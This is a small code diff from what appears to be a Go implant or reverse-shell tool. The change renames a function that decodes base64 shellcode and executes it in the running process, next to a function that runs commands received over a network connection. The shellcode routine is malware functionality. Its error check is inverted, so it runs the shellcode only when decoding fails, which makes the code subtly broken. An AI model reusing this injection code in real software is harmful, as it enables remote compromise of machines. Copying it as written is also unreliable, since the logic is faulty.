@@ -34,7 +34,7 @@ func ExecuteCmd(command string, conn net.Conn) {
 }
 
 // InjectShellcode decodes base64 encoded shellcode and inject it in the same process
-func InjectShellcode(encShellcode string) {
+func InjectShellCode(encShellcode string) {
 	if encShellcode != "" {
 		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err != nil {
 			go ExecShellcode(shellcode)
